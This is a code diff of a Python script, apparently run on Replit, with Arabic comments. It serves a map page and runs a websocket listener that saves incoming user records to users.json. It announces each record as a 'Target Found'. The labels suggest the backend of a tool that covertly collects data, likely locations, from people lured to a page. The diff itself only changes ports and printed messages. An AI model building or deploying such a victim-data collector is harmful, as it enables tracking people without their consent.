@@ -6,13 +6,13 @@ import time
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import websockets
 
-# --- خدعة التابلت لفتح الـ Webview في Replit ---
-# نستخدم المنفذ 8080 لضمان عدم وجود تضارب
+# --- أمر إجبار Replit على فتح الـ Webview ---
+# المنفذ 8080 هو المنفذ الرسمي الذي يبحث عنه Replit
 os.system("python3 -m http.server 8080 &")
 
 USER_FILE = "users.json"
-HTTP_PORT = 8000
-WS_PORT = 8765
+HTTP_PORT = 8000 # منفذ الخريطة
+WS_PORT = 9000   # منفذ استقبال البيانات (غيرناه لضمان العمل)
 
 def load_users():
     try:
@@ -32,10 +32,11 @@ async def ws_handler(ws):
         user = json.loads(data)
         user["time"] = time.strftime("%Y-%m-%d %H:%M:%S")
         save_user(user)
-        print('[+] Target Found! Check your map.')
+        print('\n[+] DONE! Target Found!')
     except: pass
 
 async def start_ws():
+    # الاستماع على المنفذ 9000
     async with websockets.serve(ws_handler,"0.0.0.0",WS_PORT):
         await asyncio.Future()
 
@@ -45,7 +46,7 @@ def start_http():
 
 if __name__ == "__main__":
     print("\n" + "="*40)
-    print("🚀 SERVER IS LIVE! OPEN THE WEBVIEW TAB")
+    print("🚀 LIVE NOW! LOOK AT THE WEBVIEW TAB")
     print("="*40)
     threading.Thread(target=start_http, daemon=True).start()
     asyncio.run(start_ws())
